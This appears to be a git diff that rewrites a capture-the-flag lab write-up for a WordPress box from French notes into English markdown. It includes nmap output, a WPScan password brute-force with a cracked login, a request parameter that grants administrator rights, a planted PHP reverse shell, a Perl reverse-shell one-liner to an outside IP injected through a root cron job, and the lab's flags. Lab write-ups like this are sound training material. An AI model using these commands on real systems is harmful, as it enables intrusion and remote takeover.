@@ -1,5 +1,8 @@
-Tatakae
+# Tatakae
 
+## Enumeration
+
+```bash
 └─$ nmap -sV -A -p- -sC -T4 10.10.196.137 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 17:27 BST
 Nmap scan report for 10.10.196.137
@@ -18,7 +21,11 @@ PORT   STATE SERVICE VERSION
 |_http-generator: WordPress 5.3.2
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+## Exploitation
 
+### A wordpress website is running on it so I use WP-Scan
+```bash
 └─$ sudo wpscan --url http://10.10.196.137/ -P /usr/share/wordlists/rockyou.txt -U user.txt -t 3
 _______________________________________________________________
          __          _______   _____
@@ -34,21 +41,29 @@ _______________________________________________________________
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
 [+] Performing password attack on Xmlrpc against 3 user/s
-[SUCCESS] - armin / bestfriends  
+[SUCCESS] - armin / bestfriends 
+```
 
-ajout de &ure_other_roles=administrator à la requete "Update Account" sur le Worpress avec Burp
+### Add "&ure_other_roles=administrator" to the requeste "Update Account" on the wordpress with Burp Suite
 
-obtention d'un acces admin a wordpress, essaye de changer le theme avec reverseshell PHP (monkeypentest) = fail
-changement du plugin avec ce meme reverseshell = SUCCES, 
+### I have changed the plugin 404 with the pentest-monkey reverse shell
 
-shell en temps que eren
+### I got a shell as eren
 
-cat user.txt : EPI{HoMe_wA2_No7H1NG_8U7_A_pEN}
+## User FLAG
 
-linpeas = rien d'interessant
-pspy64 = crontab toutes les 2min, lancement d'un script python ou on peut modifier la librairie python "os"
-ajout de execvp('perl -e 'use Socket;$i="10.8.37.214";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'')
+```cat user.txt``` : EPI{HoMe_wA2_No7H1NG_8U7_A_pEN}
 
-shell en temps que root apress execution du crontab
+## Privilege Escalation
+
+### Linpeas gave me nothing, but pspy64 yes
+
+### A script run every 2 minutes as root and use the python os library, so I have modified it with a perl command and i got a shell as root
+```python
+execvp('perl -e 'use Socket;$i="10.8.37.214";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'')
+```
+## Root FLAG
+```bash
 cd /root
-cat `ls : EPI{1_h4V3_73H_PhR33D0M_70_C0n71nu3_M0v1N9_pH0rW4RD}
+```
+```cat `ls` ``` : EPI{1_h4V3_73H_PhR33D0M_70_C0n71nu3_M0v1N9_pH0rW4RD}
